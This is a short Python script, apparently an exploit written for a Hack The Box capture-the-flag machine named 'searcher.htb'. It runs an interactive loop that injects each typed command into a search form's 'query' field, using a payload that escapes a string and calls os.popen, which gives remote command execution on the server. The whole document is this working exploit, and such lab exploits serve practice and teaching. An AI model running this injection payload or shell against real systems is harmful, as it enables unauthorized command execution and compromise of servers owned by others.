#!/usr/local/bin/python3.10

import requests
from colorama import init, Fore, Style

init()

while True:
    try:
        command = input(f"{Fore.RED}Command: {Fore.BLUE}")
    except KeyboardInterrupt:
        print('\n\n' + Fore.YELLOW + 'Exitting...' + Style.RESET_ALL)
        exit(0)
    print(Style.RESET_ALL)
    r = requests.post("http://searcher.htb/search", data = {"engine": "Accuweather", 
                                                        "query": f"') and __import__(\"os\").popen(\"{command}\").read()#"})
    print('\n' + Fore.LIGHTBLACK_EX + r.text + Style.RESET_ALL)
